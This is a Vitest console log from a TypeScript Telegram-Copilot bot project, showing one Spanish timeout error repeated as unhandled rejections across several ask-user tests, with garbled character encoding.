Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should reject response from wrong user (mismatched token)". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» doTickInner ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2656:29
 Ã”Ã˜Â» doTick ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2737:20
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2757:29
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should timeout after specified duration without response". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should handle user cancellation via cancel()". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should handle multiple simultaneous prompts with different tokens". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should handle multiple simultaneous prompts with different tokens". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should route responses to correct promise based on token". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should route responses to correct promise based on token". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should prevent old token from resolving new prompt". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should prevent old token from resolving new prompt". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should handle special characters in options". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should generate unique tokens for successive prompts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should generate unique tokens for successive prompts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should generate unique tokens for successive prompts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should generate unique tokens for successive prompts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should generate unique tokens for successive prompts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should generate unique tokens for successive prompts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should generate unique tokens for successive prompts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should generate unique tokens for successive prompts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should generate unique tokens for successive prompts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should generate unique tokens for successive prompts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should handle rapid cancel/restart cycles". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should handle rapid cancel/restart cycles". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Timeout: no se recibiâ”œâ”‚ respuesta del usuario
 Ã”Ã˜Â» src/copilot/tools.ts:75:18
     73|           pendingToken = null;
     74|           pendingTimeout = null;
